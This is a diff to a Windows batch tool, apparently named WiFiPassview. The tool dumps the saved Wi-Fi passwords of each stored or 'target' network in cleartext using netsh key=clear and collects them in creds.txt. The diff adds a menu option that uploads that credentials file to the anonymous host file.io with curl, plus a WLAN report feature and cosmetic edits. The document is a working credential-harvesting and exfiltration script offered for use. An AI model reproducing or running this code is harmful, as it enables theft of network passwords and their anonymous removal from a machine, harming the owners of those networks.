@@ -56,7 +56,7 @@ echo # %appname% %appvers% - %appstat%
 echo # by %dev%
 echo # %divider%
 echo # Checking for wireless interface...
-netsh wlan show profiles | findstr "All"
+netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
 if %errorlevel%==1 goto fail3
 cls
 title %appname% %appvers% - %appstat% [Automated Mode]
@@ -66,7 +66,7 @@ echo # %appname% %appvers% - %appstat%
 echo # by %dev%
 echo # %divider%
 echo # Checking for wireless interface...
-netsh wlan show profiles | findstr "All" > temp.txt
+netsh wlan show profiles | findstr /R /C:"[ ]:[ ]" > temp.txt
 echo # Available SSID in this Machine
 type temp.txt
 echo # %divider%
@@ -76,7 +76,7 @@ echo setlocal enabledelayedexpansion >> helper.bat
 echo for /f "tokens=5*" %%%%i in (temp.txt) do ( set val=%%%%i %%%%j >> helper.bat
 echo if "!val:~-1!" == " " set val=!val:~0,-1! >> helper.bat
 echo echo !val! ^>^> final.txt) >> helper.bat
-echo for /f "tokens=*" %%%%i in (final.txt) do @echo SSID: %%%%i ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& netsh wlan show profiles name=%%%%i key=clear ^| findstr /c:"Key Content" ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& echo # Key content is the password of your target SSID. ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt >> helper.bat
+echo for /f "tokens=*" %%%%i in (final.txt) do @echo SSID: %%%%i ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& netsh wlan show profiles name=%%%%i key=clear ^| findstr /N /R /C:"[ ]:[ ]" ^| findstr 33 ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& echo # Key content is the password of your target SSID. ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt >> helper.bat
 echo del /q temp.txt final.txt >> helper.bat
 echo exit >> helper.bat
 echo # Done...
@@ -128,7 +128,7 @@ rem =============================
 rem Manual Mode: Confirm Scan
 rem =============================
 :manualConfirm
-netsh wlan show profiles | findstr "All"
+netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
 if %errorlevel%==1 goto fail3
 goto mainualContinue
 
@@ -148,6 +148,7 @@ echo # %divider%
 netsh wlan show profiles
 echo # %divider%
 echo # Please enter the SSID of target WiFi
+echo # (e.g. WIFI-NAME or if contains spaces do "WIFI NAME")
 echo # Type "cancel" or hit enter to go back (default)
 echo #
 set /p "ssidname=# $WiFiPassview> " || set ssidname=cancel
@@ -163,7 +164,7 @@ echo # by %dev%
 echo # %tempdivider%
 echo # SSID: %ssidname%
 echo # %tempdivider%
-netsh wlan show profiles name=%ssidname% key=clear | findstr /c:"Key Content" > temp.txt
+netsh wlan show profiles name=%ssidname% key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 > temp.txt
 type temp.txt
 echo # %tempdivider%
 echo # Key content is the password of your target SSID.
@@ -189,7 +190,7 @@ cls
 title %appname% %appvers% - %appstat%
 echo # SSID: %ssidname% >> creds.txt
 echo # %tempdivider% >> creds.txt
-netsh wlan show profiles name=%ssidname% key=clear | findstr /c:"Key Content" >> creds.txt
+netsh wlan show profiles name=%ssidname% key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 >> creds.txt
 echo # %tempdivider% >> creds.txt
 echo # Key content is the password of your target SSID. >> creds.txt
 echo # %tempdivider% >> creds.txt
@@ -288,7 +289,7 @@ echo # %divider%
 color %uicolor%
 echo #
 echo # This project is originally developed by Waren Gonzaga
-echo # Version name Karin is a real name from Karin of Elris
+echo # Version name Bella is a real name from Bella of Elris
 echo # Elris is a popular KPOP Girl Group... (my bias lol)
 echo # 
 echo # %divider%
@@ -310,20 +311,24 @@ echo # by %dev%
 echo # %divider%
 color %uicolor%
 echo #
-echo # Delete "creds.txt" ............ [1]
-echo # Locate "creds.txt" ............ [2]
-echo # Open "creds.txt" in Notepad ... [3]
-echo # Premium Version ................[4]
-echo # Elris? Here I Am .............. [5]
-echo # Back to Main Menu ............. [6]
+echo # Delete "creds.txt" ......................... [1]
+echo # Locate "creds.txt" ......................... [2]
+echo # Open "creds.txt" in Notepad ................ [3]
+echo # Upload "creds.txt" to Anonymous Cloud ...... [4]
+echo # Generate WLAN Report ....................... [5]
+echo # Premium Version ............................ [6]
+echo # Elris? Here I Am ........................... [7]
+echo # Back to Main Menu .......................... [8]
 echo #
 set /p "options= # $WiFiPassview> " || set options=5
 if %options%==1 goto deleteCreds
 if %options%==2 goto locateCreds
 if %options%==3 goto notepadCreds
-if %options%==4 goto premium 
-if %options%==5 goto elris
-if %options%==6 goto mainMenu
+if %options%==4 goto uploadCreds
+if %options%==5 goto wlanreport
+if %options%==6 goto premium 
+if %options%==7 goto elris
+if %options%==8 goto mainMenu
 goto fail4
 pause>null
 
@@ -373,6 +378,171 @@ start notepad creds.txt
 goto options
 
 rem =============================
+rem Options: Upload Creds to Anonymous Cloud
+rem =============================
+:uploadCreds
+del null
+type creds.txt
+if %errorlevel%==1 goto fail2
+cls
+title %appname% %appvers% - %appstat% [Upload Collected Creds]
+color %infouicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # [Upload Creds to Anonymous Cloud]
+echo #
+echo # This feature will upload "creds.txt" to Anonymous Cloud powered by file.io
+echo # Your anonymous upload will be available for 14 days only.
+echo # 
+echo # Continue Upload ....... [1]
+echo # Back to Options ....... [2]
+echo #
+set /p "uploadCreds= # $WiFiPassview> " || set uploadCreds=2
+if %uploadCreds%==1 goto continueUpload
+if %uploadCreds%==2 goto options
+goto fail5
+pause>null
+
+rem =============================
+rem Upload Creds to Anonymous Cloud: Continue Upload
+rem =============================
+:continueUpload
+del null
+type creds.txt
+if %errorlevel%==1 goto fail2
+cls
+title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Uploading...
+curl -F "file=@creds.txt" https://file.io > logs.txt
+cls
+title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Uploaded!
+echo # Generating link...
+set /p url=<logs.txt
+del logs.txt
+echo # Got it!
+echo # Here's your shortlink...
+echo # %divider%
+echo #
+echo # Key: %url:~23,8% [Remember]
+echo # Link: %url:~41,24%
+echo #
+echo # %divider%
+echo #
+echo # Open it to browser?
+echo # Yes ....... [1]
+echo # No ........ [2]
+echo #
+set /p "browseCreds= # $WiFiPassview> " || set browseCreds=2
+if %browseCreds%==1 goto browsedCreds
+if %browseCreds%==2 goto options
+pause>null
+
+rem =============================
+rem Upload Creds to Anonymous Cloud: Browse Creds
+rem =============================
+:browsedCreds
+start %url:~41,24%
+goto options
+
+rem =============================
+rem Options: Generate WLAN Report
+rem =============================
+:wlanreport
+del null
+cls
+title %appname% %appvers% - %appstat% [Generate WLAN Report]
+color %infouicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # [Generate WLAN Report]
+echo #
+echo # This feature will execute a command to generate WLAN Report for this machine.
+echo #
+echo # Note: This feature requires an administrative permissions to proceed.
+echo # Close this program and run it as administrator to be able to work!
+echo # %divider%
+echo #
+echo # Press any key to continue... (except power button lol)
+pause>null
+goto wlanreportAdmin
+
+rem =============================
+rem Generate WLAN Report: Check Admin
+rem =============================
+:wlanreportAdmin
+del null
+cls
+@echo off
+title %appname% %appvers% - %appstat% [Generate WLAN Report]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Administrative permissions required. Detecting permissions...
+ping localhost -n 2 >NUL
+net session >nul 2>&1
+if %errorLevel% == 0 (
+echo # Administrator privileges found!
+echo # Starting WLAN Reporting...
+ping localhost -n 2 >NUL
+goto wlanreportCreate
+) else (
+cls
+color %erruicolor%
+title %appname% %appvers% - %appstat% [Generate WLAN Report]
+color %erruicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # ERROR ERROR ERROR [FAIL]
+echo #
+echo # WLAN reporting will not work!
+echo # Close this program and run it as administrator and try again.
+echo # %divider%
+echo #
+echo # Press any key to continue...
+pause>null
+goto options
+)
+
+rem =============================
+rem Generate WLAN Report: Create
+rem =============================
+:wlanreportCreate
+del null
+cls
+title %appname% %appvers% - %appstat% [Generate WLAN Report]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+netsh wlan show wlanreport
+echo # %divider%
+echo #
+echo # Press any key to continue...
+pause>null
+start C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html
+goto options
+
+rem =============================
 rem Options: Premium
 rem =============================
 :premium
@@ -383,7 +553,8 @@ rem =============================
 rem Options: Elris
 rem =============================
 :elris
-start https://www.youtube.com/watch?v=iPAIlZM1VUU
+rem stan elris hahaha
+start https://www.youtube.com/watch?v=tpLro7n3PWo
 goto options
 
 rem =============================
@@ -468,6 +639,25 @@ echo #
 echo # Press any key to continue... (except power button lol)
 pause>null
 goto mainMenu
+
+rem =============================
+rem Program Error
+rem =============================
+:fail5
+del null
+cls
+title %appname% %appvers% - %appstat% [Error]
+color %erruicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Invalid option! Please try again...
+echo # %divider%
+echo #
+echo # Press any key to continue... (except power button lol)
+pause>null
+goto options
 
 rem =============================
 rem Exit Option Function
